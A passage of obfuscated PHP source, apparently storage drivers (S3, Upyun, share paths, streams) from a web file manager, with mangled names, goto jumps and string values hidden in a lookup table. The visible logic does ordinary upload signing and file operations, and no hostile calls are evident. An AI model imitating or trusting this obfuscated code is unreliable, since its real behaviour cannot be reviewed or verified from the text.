$_SERVER[Ìó]; $dãĞîÅÉ° = $this->parse($cœÓ—½†”); $cœÓ—½†” = Model($CœŠšî²îŞ[539])->createFileName($dãĞîÅÉ°[$CœŠšî²îŞ[75]]); $eœ­–­î˜ = IO::uploadLink($cœÓ—½†”, $cÇïñ¯åšÂ); return $eœ­–­î˜; } public function fileNameAuto($F§¼£ì…›´, $a—ôŞ¡‡Ğ…, $a•£ôÍ» = REPEAT_REPLACE, $D·ÌÍ¤äÀ„ = false) { return $this->model->fileNameAuto($F§¼£ì…›´, $a—ôŞ¡‡Ğ…, $a•£ôÍ», $D·ÌÍ¤äÀ„); } public function fileNameExist($A ½Óº™Âğ, $C³Û éî·‘) { return $this->model->fileNameExist($A ½Óº™Âğ, $C³Û éî·‘); } protected function _fileOut($E–×È—“†Á, $C´‘ì®Ì…õ = false, $C½øÛ¨âñø = false, $bÓù Ñİ•œ = '', $bã¢¹‚”ÎÜ = false) { goto DÉ‹Üî‚¬Š; DÉ‹Üî‚¬Š: $C¹†Ä±ØŸ =& $_SERVER[Ìó]; $d¼ôÂÓÙÓ‚ = $this->model->sourceInfo($E–×È—“†Á); if ($d¼ôÂÓÙÓ‚[$C¹†Ä±ØŸ[366]] == $C¹†Ä±ØŸ[83]) { header($C¹†Ä±ØŸ[1108]); die; } goto CñŠîÆ®ò·; bÊÁ¢èĞ»: if ($bã¢¹‚”ÎÜ) { return IO::fileOutServer($fÇå•ù†Õº[$C¹†Ä±ØŸ[75]], $C´‘ì®Ì…õ, $bŞÒŞõ‰Œ—, $bÓù Ñİ•œ); } IO::fileOut($fÇå•ù†Õº[$C¹†Ä±ØŸ[75]], $C´‘ì®Ì…õ, $bŞÒŞõ‰Œ—, $bÓù Ñİ•œ); goto dÏ¥–§ßÀ–; CñŠîÆ®ò·: $fÇå•ù†Õº = $this->model->fileInfoGet($E–×È—“†Á); $bÓù Ñİ•œ = $fÇå•ù†Õº[$C¹†Ä±ØŸ[159]] ? $fÇå•ù†Õº[$C¹†Ä±ØŸ[159]] : $bÓù Ñİ•œ; $bŞÒŞõ‰Œ— = isset($GLOBALS[$C¹†Ä±ØŸ[1109]]) ? $GLOBALS[$C¹†Ä±ØŸ[1109]] : $d¼ôÂÓÙÓ‚[$C¹†Ä±ØŸ[28]]; goto bÊÁ¢èĞ»; dÏ¥–§ßÀ–: } public function fileOut($e£„ò”ÄŸè, $A‹Ø®î£î = false, $AÙß†£‹· = false, $eå‚©ÉÒœÕ = '') { $this->_fileOut($e£„ò”ÄŸè, $A‹Ø®î£î, $AÙß†£‹·, $eå‚©ÉÒœÕ); } public function fileOutServer($DšˆßğİÍ¹, $d¶ Öµ…Ç = false, $cŸç¸†‰Ğé = false, $f„Ú­î Š = '') { $this->_fileOut($DšˆßğİÍ¹, $d¶ Öµ…Ç, $cŸç¸†‰Ğé, $f„Ú­î Š, !0); } protected function _fileOutImage($bŸ…ÀîöøÜ, $c½ÙƒÑ“† = 250) { $d¾÷‚Òø­‚ =& $_SERVER[Ìó]; $BÇº±èĞŒÖ = $this->model->sourceInfo($bŸ…ÀîöøÜ); if ($BÇº±èĞŒÖ[$d¾÷‚Òø­‚[366]] == $d¾÷‚Òø­‚[83]) { show_json($d¾÷‚Òø­‚[1110] . $bŸ…ÀîöøÜ, !1); } $GLOBALS[$d¾÷‚Òø­‚[1109]] = $BÇº±èĞŒÖ[$d¾÷‚Òø­‚[28]]; $f…ùÊ­®  = $this->model->fileInfoGet($bŸ…ÀîöøÜ); IO::fileOutImage($f…ùÊ­® [$d¾÷‚Òø­‚[75]], $c½ÙƒÑ“†); } public function fileOutImage($CåœĞá‡ê, $e»«³®±¿ = 250) { $this->_fileOutImage($CåœĞá‡ê, $e»«³®±¿); } public function fileOutImageServer($B•ÍäÒÈÄ, $Fµ¥¡ùÅÏØ = 250) { $this->_fileOutImage($B•ÍäÒÈÄ, $Fµ¥¡ùÅÏØ); } public function link($D†—”¶“±‘, $d‡´­ƒ¹ë¯ = '') { $fÆ¸“õÉ¥… = $this->model->fileInfoGet($D†—”¶“±‘); return IO::link($fÆ¸“õÉ¥…[$_SERVER[Ìó][75]], $d‡´­ƒ¹ë¯); } protected function parse($cÍ¦¬åá¸ñ) { $b™ğ„ñ÷¯÷ =& $_SERVER[Ìó]; if (strstr($cÍ¦¬åá¸ñ, $b™ğ„ñ÷¯÷[8]) === !1) { return array($b™ğ„ñ÷¯÷[381] => intval($cÍ¦¬åá¸ñ), $b™ğ„ñ÷¯÷[75] => $b™ğ„ñ÷¯÷[33], $b™ğ„ñ÷¯÷[1107] => array()); } $FÏËˆŞ“Ğ = explode($b™ğ„ñ÷¯÷[8], trim($cÍ¦¬åá¸ñ, $b™ğ„ñ÷¯÷[8])); if (count($FÏËˆŞ“Ğ) < 2) { show_tips($cÍ¦¬åá¸ñ . $b™ğ„ñ÷¯÷[1111]); } return array($b™ğ„ñ÷¯÷[381] => intval($FÏËˆŞ“Ğ[0]), $b™ğ„ñ÷¯÷[75] => $FÏËˆŞ“Ğ[1], $b™ğ„ñ÷¯÷[1107] => array_slice($FÏËˆŞ“Ğ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($CÑ‚ï¥Ù¾‚) { $this->pathParse = $CÑ‚ï¥Ù¾‚; $this->model = Model($_SERVER[Ìó][1106]); } public function getPathOuter($A¹…¹”äæ›) { $a¿î•åŒç =& $_SERVER[Ìó]; if (!$A¹…¹”äæ›) { return $A¹…¹”äæ›; } $Cˆù» ²ƒ† = $this->parse($A¹…¹”äæ›); return trim(KodIO::makeShare($this->pathParse[$a¿î•åŒç[363]], $Cˆù» ²ƒ†[$a¿î•åŒç[363]]), $a¿î•åŒç[8]); } protected function infoParse($Bàˆâôó×”, $b‹˜Õ…é = false, $f„¡ ½Æ„ = false) { $föµĞÇ‘õƒ =& $_SERVER[Ìó]; $c«íæœ™Ÿ‘ = $this->pathParse[$föµĞÇ‘õƒ[363]]; $Bâã·Ú§†š = trim($this->pathParse[$föµĞÇ‘õƒ[1007]], $föµĞÇ‘õƒ[8]); return Action($föµĞÇ‘õƒ[1112])->sharePathInfo($c«íæœ™Ÿ‘, $Bâã·Ú§†š); } public function infoFull($C¨äŒœò£±) { $c¿£ƒãÅ¿ =& $_SERVER[Ìó]; $Fğ³Ÿßß = explode($c¿£ƒãÅ¿[8], trim($C¨äŒœò£±, $c¿£ƒãÅ¿[8])); if (count($Fğ³Ÿßß) > 1) { $C¯õ¦Ù×ê÷ = implode($c¿£ƒãÅ¿[8], array_splice($Fğ³Ÿßß, 1)); $EÄ›´Â‡‚ = $this->model->pathInfoByPath($Fğ³Ÿßß[0], $C¯õ¦Ù×ê÷); if (!$EÄ›´Â‡‚) { return !1; } $this->pathParse[$c¿£ƒãÅ¿[1007]] = $EÄ›´Â‡‚[$c¿£ƒãÅ¿[365]]; } return $this->infoParse($C¨äŒœò£±); } public function listAll($D“Ç³»“Îµ) { goto dâù°Õê¾Ş; f™öÄƒœ¼ñ: $Dˆ¬´ğ†ÂÄ = $this->model->listAll($D“Ç³»“Îµ); $F§¶é‹œİ = Model($aİ«œâòšŞ[531])->getInfo($CáÚë¿ÇÎ[$aİ«œâòšŞ[436]]); $c‰”åŞĞ¶İ = Action($aİ«œâòšŞ[1112]); goto FÑ´¢®²Æ; FÑ´¢®²Æ: foreach ($Dˆ¬´ğ†ÂÄ as &$DªÑêğ˜Š¢) { check_abort(); $DªÑêğ˜Š¢[$aİ«œâòšŞ[387]] = $c‰”åŞĞ¶İ->_shareItemeParse($DªÑêğ˜Š¢[$aİ«œâòšŞ[387]], $F§¶é‹œİ); } return $Dˆ¬´ğ†ÂÄ; goto Aéä§ë‚ò; dâù°Õê¾Ş: $aİ«œâòšŞ =& $_SERVER[Ìó]; $CáÚë¿ÇÎ = IO::info($this->pathParse[$aİ«œâòšŞ[75]]); if (!$CáÚë¿ÇÎ) { return array(); } goto f™öÄƒœ¼ñ; Aéä§ë‚ò: } } $BŒÖÄÉÄ¦ª = LIB_DIR . $_SERVER[Ìó][794]; goto ağÏõ¨®”œ; bÑ…º±ñÂ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($eÉ“ÅõÛÚæ) { parent::__construct($eÉ“ÅõÛÚæ); } public function uploadFormData($EÂ³„“æ, $d†Øé÷ÔÔ = 3600) { goto b—…™ªóŠ; D³Š¡ô÷«ø: $D£ÍÎ‰ÇÓ = $d›·í÷Ú½[59]; $C„‡–ÚƒÏğ = gmdate($d›·í÷Ú½[1123]); $Có–‹„ƒ = gmdate($d›·í÷Ú½[686]); goto C×¶ÓÜïÙ; C×¶ÓÜïÙ: $F¼Š®æÄè = $d›·í÷Ú½[1124]; $FĞ¤œÛ é = $d†Øé÷ÔÔ . $d›·í÷Ú½[33]; $BêâÑÓò‚† = $d›·í÷Ú½[1089]; goto E›±£Ï¡¢²; f¼ÔäÍØ¢: $Aİéôïë³Ê = base64_encode(json_encode($B°ô·‘ª¯)); $AÊÂ¼ÃÔà… = hash_hmac($d›·í÷Ú½[1132], $Có–‹„ƒ, $d›·í÷Ú½[1133] . $this->secret, !0); $eÁÁáßøŸÔ = hash_hmac($d›·í÷Ú½[1132], $this->region, $AÊÂ¼ÃÔà…, !0); goto CÎ½Ø¡š¯ó; E›±£Ï¡¢²: $EçºãÇ»Á± = array($this->accessKey, $Có–‹„ƒ, $this->region, $D£ÍÎ‰ÇÓ, $F¼Š®æÄè); $CóÎå¶îŸ = implode($d›·í÷Ú½[8], $EçºãÇ»Á±); $B°ô·‘ª¯ = array($d›·í÷Ú½[1091] => gmdate($d›·í÷Ú½[1090], strtotime($d›·í÷Ú½[1125])), $d›·í÷Ú½[1092] => array(array($d›·í÷Ú½[1094] => $this->bucket), array($d›·í÷Ú½[1093] => $dŒòŠ¹È‚ƒ), array($d›·í÷Ú½[1095], $d›·í÷Ú½[1096], $d›·í÷Ú½[33]), array($d›·í÷Ú½[1095], $d›·í÷Ú½[1126], $d›·í÷Ú½[33]), array($d›·í÷Ú½[1095], $d›·í÷Ú½[1127], $d›·í÷Ú½[33]), array($d›·í÷Ú½[1097] => $BêâÑÓò‚†), array($d›·í÷Ú½[1128] => $CóÎå¶îŸ), array($d›·í÷Ú½[1129] => $AÄîñ ‚î‡), array($d›·í÷Ú½[1130] => $C„‡–ÚƒÏğ), array($d›·í÷Ú½[1131] => $FĞ¤œÛ é))); goto f¼ÔäÍØ¢; CÎ½Ø¡š¯ó: $f¥ÅÛÁÄİÏ = hash_hmac($d›·í÷Ú½[1132], $D£ÍÎ‰ÇÓ, $eÁÁáßøŸÔ, !0); $F­„ŠŞ©¹¦ = hash_hmac($d›·í÷Ú½[1132], $F¼Š®æÄè, $f¥ÅÛÁÄİÏ, !0); $B¨ô¹òõÎŸ = hash_hmac($d›·í÷Ú½[1132], $Aİéôïë³Ê, $F­„ŠŞ©¹¦); goto f’ÇëøÇ»ï; b—…™ªóŠ: $d›·í÷Ú½ =& $_SERVER[Ìó]; $dŒòŠ¹È‚ƒ = $d›·í÷Ú½[181]; $AÄîñ ‚î‡ = $d›·í÷Ú½[1122]; goto D³Š¡ô÷«ø; f’ÇëøÇ»ï: $D¶Şà ÏŒÑ = array($d›·í÷Ú½[195] => $d›·í÷Ú½[33], $d›·í÷Ú½[1134] => $d›·í÷Ú½[33], $d›·í÷Ú½[1093] => $dŒòŠ¹È‚ƒ, $d›·í÷Ú½[1097] => $BêâÑÓò‚†, $d›·í÷Ú½[1101] => $Aİéôïë³Ê, $d›·í÷Ú½[1135] => $CóÎå¶îŸ, $d›·í÷Ú½[1136] => $AÄîñ ‚î‡, $d›·í÷Ú½[1137] => $C„‡–ÚƒÏğ, $d›·í÷Ú½[1138] => $FĞ¤œÛ é, $d›·í÷Ú½[1139] => $B¨ô¹òõÎŸ, $d›·í÷Ú½[165] => $this->getHost()); return $D¶Şà ÏŒÑ; goto a«ùÍ‹•ƒÍ; a«ùÍ‹•ƒÍ: } public function multiUploadFormData($E‘ÂÌƒºòÙ, $DØ¼ì’˜ã = 3600) { $Eöğ¹ÎÒ ï =& $_SERVER[Ìó]; $CÀŸ¦¦êğ = gmdate($Eöğ¹ÎÒ ï[1218]); $CŸñ¹‡·“ã = array(); $Cå™—ˆÙùã = $this->client->getUploadId($this->bucket, $E‘ÂÌƒºòÙ, $CŸñ¹‡·“ã); if (!$Cå™—ˆÙùã) { return !1; } return array($Eöğ¹ÎÒ ï[205] => $Cå™—ˆÙùã, $Eöğ¹ÎÒ ï[165] => $this->getHost() . $Eöğ¹ÎÒ ï[8] . $this->pathEncode($E‘ÂÌƒºòÙ), $Eöğ¹ÎÒ ï[206] => $CÀŸ¦¦êğ, $Eöğ¹ÎÒ ï[89] => $E‘ÂÌƒºòÙ); } public function multiUploadAuthData($AïâÁ“ÊñÍ, $CÏÛ¨ÚàÒÔ = array()) { goto D¸àâÌç¹¦; DÄ¾çâ¦¨ô: $D‚ ªí¨¯ƒ = $bÓÑê«¹öœ[210]; $fâğƒ—ÀÛ­ = $bÓÑê«¹öœ[8] . $this->pathEncode($CÂÄ¯¹½ŒÓ) . $e¨¥Ÿïéî; $AŠà‡–Š£¶ = $this->client->__getSignatureV4($a•²»¹ô„, $BÁİ„å¼¼®, $D‚ ªí¨¯ƒ, $fâğƒ—ÀÛ­); goto d–ÇääŒ£Ç; c‚¸†ÍÍÜ: if (isset($CÏÛ¨ÚàÒÔ[$bÓÑê«¹öœ[1219]])) { $a•²»¹ô„[$bÓÑê«¹öœ[1220]] = $CÏÛ¨ÚàÒÔ[$bÓÑê«¹öœ[1219]]; } $dªÍê‚¤Ñ‚ = explode($bÓÑê«¹öœ[167], $this->getHost()); $BÁİ„å¼¼® = array($bÓÑê«¹öœ[1221] => $dªÍê‚¤Ñ‚[1], $bÓÑê«¹öœ[1222] => $bÓÑê«¹öœ[33], $bÓÑê«¹öœ[195] => $bÓÑê«¹öœ[115], $bÓÑê«¹öœ[1134] => $CÏÛ¨ÚàÒÔ[$bÓÑê«¹öœ[77]]); goto DÄ¾çâ¦¨ô; d–ÇääŒ£Ç: if (strpos($e¨¥Ÿïéî, $bÓÑê«¹öœ[209]) === 0) { if (isset($a•²»¹ô„[$bÓÑê«¹öœ[1220]])) { $B®ÏùéÖ¼ª = $a•²»¹ô„[$bÓÑê«¹öœ[1220]]; } else { if (isset($AŠà‡–Š£¶[$bÓÑê«¹öœ[1220]])) { $B®ÏùéÖ¼ª = $AŠà‡–Š£¶[$bÓÑê«¹öœ[1220]]; } else { $B®ÏùéÖ¼ª = hash($bÓÑê«¹öœ[1132], $bÓÑê«¹öœ[33]); } } return array($bÓÑê«¹öœ[216] => $AŠà‡–Š£¶[$bÓÑê«¹öœ[216]], $bÓÑê«¹öœ[1220] => $B®ÏùéÖ¼ª, $bÓÑê«¹öœ[206] => $AŠà‡–Š£¶[$bÓÑê«¹öœ[1223]]); } return $AŠà‡–Š£¶[$bÓÑê«¹öœ[216]]; goto dš¶À…¸ •; cÕÂôğ¦Îš: unset($CÏÛ¨ÚàÒÔ[$bÓÑê«¹öœ[89]]); if (isset($CÏÛ¨ÚàÒÔ[$bÓÑê«¹öœ[207]])) { return $this->listUploadParts($CÂÄ¯¹½ŒÓ, $CÏÛ¨ÚàÒÔ); } $a•²»¹ô„ = array(); goto c‚¸†ÍÍÜ; D¸àâÌç¹¦: $bÓÑê«¹öœ =& $_SERVER[Ìó]; $e¨¥Ÿïéî = isset($CÏÛ¨ÚàÒÔ[$bÓÑê«¹öœ[156]]) ? $CÏÛ¨ÚàÒÔ[$bÓÑê«¹öœ[156]] : $bÓÑê«¹öœ[33]; $CÂÄ¯¹½ŒÓ = $CÏÛ¨ÚàÒÔ[$bÓÑê«¹öœ[89]]; goto cÕÂôğ¦Îš; dš¶À…¸ •: } public function listUploadParts($C—Âµ…‘‡ª, $B‰ƒä«ô½ˆ = array()) { goto Cğ¬ÅØæ‰‡; bª»ŒÑåßÊ: if (!$DÃ©ù«™ƒ) { return !1; } $Eƒ ƒ‡Œ– = $BÎâ®š–¸‚[1224]; foreach ($DÃ©ù«™ƒ as $b›…µ´ç›ğ) { $Eƒ ƒ‡Œ– .= $BÎâ®š–¸‚[1225] . "\74\120\141\162\164\116\x75\155\x62\x65\162\76{$b›…µ´ç›ğ[$BÎâ®š–¸‚[1176]]}\74\x2f\120\141\x72\164\116\165\x6d\142\145\x72\x3e\xa" . "\74\105\x54\141\147\x3e{$b›…µ´ç›ğ[$BÎâ®š–¸‚[1177]]}\x3c\x2f\x45\124\x61\147\x3e\12" . $BÎâ®š–¸‚[1226]; } goto bÉ°–”¶‰Š; B—ã§µŞ¢‹: $cÃé¨Á Ûê = $this->client->__getSignatureV4($A–ë„Ô×æƒ, $D†›ØØƒäø, $AÖÙÎ±Ëóğ, $CÒÖèƒÙÂ±, $Eƒ ƒ‡Œ–); return array($BÎâ®š–¸‚[216] => $cÃé¨Á Ûê[$BÎâ®š–¸‚[216]], $BÎâ®š–¸‚[206] => $cÃé¨Á Ûê[$BÎâ®š–¸‚[1223]], $BÎâ®š–¸‚[218] => $DÃ©ù«™ƒ, $BÎâ®š–¸‚[1220] => $cÃé¨Á Ûê[$BÎâ®š–¸‚[1220]]); goto d—‘Øáãô‚; bÉ°–”¶‰Š: $Eƒ ƒ‡Œ– .= $BÎâ®š–¸‚[1227]; $A–ë„Ô×æƒ = array(); $b•§ñ—ŒÂ¡ = explode($BÎâ®š–¸‚[167], $this->getHost()); goto A¡ùæ²ø³‡; Cğ¬ÅØæ‰‡: $BÎâ®š–¸‚ =& $_SERVER[Ìó]; $B…¤‰‘”ˆî = str_replace($BÎâ®š–¸‚[217], $BÎâ®š–¸‚[33], $B‰ƒä«ô½ˆ[$BÎâ®š–¸‚[156]]); $DÃ©ù«™ƒ = $this->client->listParts($this->bucket, $C—Âµ…‘‡ª, $B…¤‰‘”ˆî); goto bª»ŒÑåßÊ; A¡ùæ²ø³‡: $D†›ØØƒäø = array($BÎâ®š–¸‚[1221] => $b•§ñ—ŒÂ¡[1], $BÎâ®š–¸‚[195] => $BÎâ®š–¸‚[115], $BÎâ®š–¸‚[1134] => strlen($Eƒ ƒ‡Œ–)); $AÖÙÎ±Ëóğ = $BÎâ®š–¸‚[208]; $CÒÖèƒÙÂ± = $BÎâ®š–¸‚[8] . $this->pathEncode($C—Âµ…‘‡ª) . $B‰ƒä«ô½ˆ[$BÎâ®š–¸‚[156]]; goto B—ã§µŞ¢‹; d—‘Øáãô‚: } public function link($FÇç½æ ¢ƒ, $E¨Ÿ®¢Î‡¿ = array()) { return parent::link($FÇç½æ ¢ƒ, $E¨Ÿ®¢Î‡¿); } public function fileOut($F˜àÆÀÊÂÖ, $AÊõ¼‰™ = false, $AÔŠÍ¯Ç = false, $eÉåø˜ö‘Ë = '') { if (strstr($this->endpoint, $_SERVER[Ìó][1228])) { return parent::fileOutServer($F˜àÆÀÊÂÖ, $AÊõ¼‰™, $AÔŠÍ¯Ç, $eÉåø˜ö‘Ë); } parent::fileOut($F˜àÆÀÊÂÖ, $AÊõ¼‰™, $AÔŠÍ¯Ç, $eÉåø˜ö‘Ë); } public function fileOutImage($c°Å³ëÆÇ, $d¾Ûë¨‡†© = 250) { if (strstr($this->endpoint, $_SERVER[Ìó][1228])) { return parent::fileOutImageServer($c°Å³ëÆÇ, $d¾Ûë¨‡†©); } parent::fileOutImage($c°Å³ëÆÇ, $d¾Ûë¨‡†©); } public function fileOutLink($FÚ’¼èå¢ø) { $D¨ˆœÕ İ÷ =& $_SERVER[Ìó]; if (substr($FÚ’¼èå¢ø, 0, 7) == $D¨ˆœÕ İ÷[1104]) { $FÚ’¼èå¢ø = $D¨ˆœÕ İ÷[1105] . substr($FÚ’¼èå¢ø, 7); } header($D¨ˆœÕ İ÷[152] . $FÚ’¼èå¢ø); die; } public function getHost() { $a‡†ù‹ìÌ‘ =& $_SERVER[Ìó]; $DÇò„œ²Î… = str_rtrim(parent::getHost(), $a‡†ù‹ìÌ‘[8] . $this->bucket); $DÇò„œ²Î… = explode($a‡†ù‹ìÌ‘[167], $DÇò„œ²Î…); return $DÇò„œ²Î…[0] . $a‡†ù‹ìÌ‘[167] . $this->bucket . $a‡†ù‹ìÌ‘[91] . $DÇò„œ²Î…[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Eß²»ï£ª, $bÇ¬…†ì¾³ = 0) { parent::__construct(); $this->source = $Eß²»ï£ª; $this->sourceSize = $bÇ¬…†ì¾³; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($dŒÅççµ¡› = false) { return $this->sourceSize; } public function getContent($BÑ×‡¤ÖŠÁ = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $fâ¦éô‰† = ftell($this->source); $A¢êœÅ‹‰ = @fread($this->source, $this->sourceSize); fseek($this->source, $fâ¦éô‰†); return $A¢êœÅ‹‰; } } public function fileSubstr($AÇ‚¹ôóù = false, $f‰ËÎÓŠ–‘ = 0, $dëƒŠø¢ = 0) { if (!$dëƒŠø¢) { $dëƒŠø¢ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $f‰ËÎÓŠ–‘, $dëƒŠø¢); } if ($this->sourceType == self::TYPE_FILE) { $EÏ—Ù¸ÃøÊ = ftell($this->source); fseek($this->source, $EÏ—Ù¸ÃøÊ + $f‰ËÎÓŠ–‘); $d¾Çöµ‡Ê’ = @fread($this->source, $dëƒŠø¢); fseek($this->source, $EÏ—Ù¸ÃøÊ); return $d¾Çöµ‡Ê’; } } public function hashMd5($dŠğîâ“ï = false) { return md5($this->getContent()); } public static function hash($eŸ›ÅÚ±å¨, $b–™´¤‡®ª = 0) { $aÏğğ•¤‚Ÿ = new PathDriverStream($eŸ›ÅÚ±å¨, $b–™´¤‡®ª); return $aÏğğ•¤‚Ÿ->hashSimple($eŸ›ÅÚ±å¨); } public static function md5($e†¿‚ôøƒ¢, $aÑßéõ¼˜Ï = 0) { $a¬ñˆ«ë…— = new PathDriverStream($e†¿‚ôøƒ¢, $aÑßéõ¼˜Ï); return $a¬ñˆ«ë…—->hashMd5($e†¿‚ôøƒ¢); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\x3a\57\x2f\x76\60\56\x61\x70\151\56\x75\x70\x79\x75\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($DãÚ’Äº…) { parent::__construct(); $this->_init($DãÚ’Äº…); } public function _init($FÏ‘èß›„ˆ) { foreach ($FÏ‘èß›„ˆ as $AøğÎ¢«‰° => $FËÉùØÔ•ë) { if (isset($this->{$AøğÎ¢«‰°})) { $this->{$AøğÎ¢«‰°} = $FËÉùØÔ•ë; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[Ìó][1229], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($DÒ‚Ê‚‡ õ, $E×„’¥óÃñ = "\x47\105\x54") { $FÅãîÖŠìã =& $_SERVER[Ìó]; $A„œÀ ¥‚§ = gmdate($FÅãîÖŠìã[1193]); $aîô ¾ô = base64_encode(hash_hmac($FÅãîÖŠìã[1230], "{$E×„’¥óÃñ}\46{$DÒ‚Ê‚‡ õ}\46{$A„œÀ ¥‚§}", md5("{$this->userpass}"), !0)); $fæ¯Ùâ‘»¿ = array("\101\165\164\150\x6f\x72\x69\172\x61\x74\151\157\156\x3a\x55\x50\131\125\x4e\x20{$this->username}\72{$aîô ¾ô}", "\x44\x61\x74\145\72{$A„œÀ ¥‚§}"); return $fæ¯Ùâ‘»¿; } public function ussRequest($D÷“İ®™Ä, $CÖŒÛ•æƒÆ = "\107\105\x54", $EÉ¯­ÂÚ‡Á = false, $CšÁ”¨ˆÏ = false, $ešİêÌÒÌ­ = false) { goto c‰ èäì·Ş; c‰ èäì·Ş: $c‘š˜Ü¢¬ò =& $_SERVER[Ìó]; $D÷“İ®™Ä = trim($D÷“İ®™Ä, $c‘š˜Ü¢¬ò[8]); $c¼’øî° = "\57{$this->bucket}\57{$D÷“İ®™Ä}"; goto A´ĞŒÌ˜©Ï; A´ĞŒÌ˜©Ï: $F«‡ºİñî» = $this->ussHeaders($c¼’øî°, $CÖŒÛ•æƒÆ); if ($CšÁ”¨ˆÏ) { $F«‡ºİñî» = array_merge($F«‡ºİñî», $CšÁ”¨ˆÏ); } $A¼Ï­Œ§ß = url_request($this->endpoint . $c¼’øî°, $CÖŒÛ•æƒÆ, $EÉ¯­ÂÚ‡Á, $F«‡ºİñî», $ešİêÌÒÌ­); goto eÍÊÑó×‚; eÍÊÑó×‚: if (!$A¼Ï­Œ§ß) { return array($c‘š˜Ü¢¬ò[1028] => !1, $c‘š˜Ü¢¬ò[1030] => $c‘š˜Ü¢¬ò[1231]); } if (strtolower($CÖŒÛ•æƒÆ) == $c‘š˜Ü¢¬ò[180] || in_array($A¼Ï­Œ§ß[$c‘š˜Ü¢¬ò[1028]], array($c‘š˜Ü¢¬ò[1089], $c‘š˜Ü¢¬ò[1232]))) { $EÉ¯­ÂÚ‡Á = $A¼Ï­Œ§ß[$c‘š˜Ü¢¬ò[1233]]; } else { $EÉ¯­ÂÚ‡Á = json_decode($A¼Ï­Œ§ß[$c‘š˜Ü¢¬ò[1030]], !0); if (!$EÉ¯­ÂÚ‡Á) { $EÉ¯­ÂÚ‡Á = $A¼Ï­Œ§ß[$c‘š˜Ü¢¬ò[1030]]; } else { if (!$A¼Ï­Œ§ß[$c‘š˜Ü¢¬ò[685]] && isset($EÉ¯­ÂÚ‡Á[$c‘š˜Ü¢¬ò[1234]])) { $EÉ¯­ÂÚ‡Á = $EÉ¯­ÂÚ‡Á[$c‘š˜Ü¢¬ò[1234]]; } } } return array($c‘š˜Ü¢¬ò[1028] => $A¼Ï­Œ§ß[$c‘š˜Ü¢¬ò[685]], $c‘š˜Ü¢¬ò[1030] => $EÉ¯­ÂÚ‡Á); goto c²šíª™Öç; c²šíª™Öç: } public function mkfile($dà¶ä¡ÓÔ¸, $a—“Ï£Õ‚§ = '', $bèìÂˆí®È = REPEAT_RENAME) { if ($this->setContent($dà¶ä¡ÓÔ¸, $a—“Ï£Õ‚§)) { return $this->getPathOuter($dà¶ä¡ÓÔ¸); } return !1; } public function mkdir($fÃ˜ªº‰¶¶, $fÚÇ¶†Ã›Š = REPEAT_SKIP) { $c•”å‰âñ =& $_SERVER[Ìó]; $B”ƒšİ¢à = trim($fÃ˜ªº‰¶¶, $c•”å‰âñ[8]); if ($this->_isFolder($B”ƒšİ¢à)) { return $this->getPathOuter($B”ƒšİ¢à); } $cßóğé¶” = array($c•”å‰âñ[1235]); $fÉ§Èˆ×‚Á = $this->ussRequest($B”ƒšİ¢à, $c•”å‰âñ[208], !1, $cßóğé¶”); return $fÉ§Èˆ×‚Á[$c•”å‰âñ[1028]] ? $this->getPathOuter($B”ƒšİ¢à) : !1; } public function copyFile($A¤— ¥Ñƒ, $Bæ³÷˜±–Œ) { $DºÓŸòîÓ =& $_SERVER[Ìó]; $cÍ”«­¡¿ = array($DºÓŸòîÓ[1236] . "\x2f{$this->bucket}\x2f{$A¤— ¥Ñƒ}", $DºÓŸòîÓ[1237]); $böÃºÇì‰³ = $this->ussRequest($Bæ³÷˜±–Œ, $DºÓŸòîÓ[210], !1, $cÍ”«­¡¿); return $böÃºÇì‰³[$DºÓŸòîÓ[1028]] ? !0 : !1; } public function moveFile($C¢…Ç¥ˆ—, $A¡ì‡­åËø) { $C–‘¦‰£¥” =& $_SERVER[Ìó]; $fâ³Ó©îõ° = array($C–‘¦‰£¥”[1238] . "\x2f{$this->bucket}\x2f{$C¢…Ç¥ˆ—}", $C–‘¦‰£¥”[1237]); $A˜‡¬éˆ½Ã = $this->ussRequest($A¡ì‡­åËø, $C–‘¦‰£¥”[210], !1, $fâ³Ó©îõ°); return $A˜‡¬éˆ½Ã[$C–‘¦‰£¥”[1028]] ? !0 : !1; } public function delFile($aĞ’‡„íÚ) { $e°Ÿ‚éŠ =& $_SERVER[Ìó]; $CÇ‹Ä¹³¬” = $this->ussRequest($aĞ’‡„íÚ, $e°Ÿ‚éŠ[1239]); return $CÇ‹Ä¹³¬”[$e°Ÿ‚éŠ[1028]] ? !0 : !1; } public function delFolder($EÜÌ»ßïéƒ) { $C­ŒëËó•­ =& $_SERVER[Ìó]; $FË˜ÑÎá¶­ = $this->listAll($EÜÌ»ßïéƒ); krsort($FË˜ÑÎá¶­); foreach ($FË˜ÑÎá¶­ as $E„È¾øÈ£Ã) { $this->ussRequest($E„È¾øÈ£Ã[$C­ŒëËó•­[75]], $C­ŒëËó•­[1239]); } return $this->ussRequest($EÜÌ»ßïéƒ, $C­ŒëËó•­[1239]); } public function rename($a¼ÆĞòî, $a‚ÉÏ–ç‡) { if ($this->isFile($a¼ÆĞòî)) { $a‚ÉÏ–ç‡ = get_path_father($a¼ÆĞòî) . $a‚ÉÏ–ç‡; return $this->moveFile($a¼ÆĞòî, $a‚ÉÏ–ç‡); } return $this->renameObject($a¼ÆĞòî, $a‚ÉÏ–ç‡); } public function fileInfo($DŒÇ¾é½ÊÒ, $cà÷ÚÎÉâ— = false, $E™áÒœ÷Œø = array()) { $Bƒ·ÁÖ½„ =& $_SERVER[Ìó]; if ($cà÷ÚÎÉâ—) { return array($Bƒ·ÁÖ½„[28] => $this->pathThis($DŒÇ¾é½ÊÒ), $Bƒ·ÁÖ½„[75] => 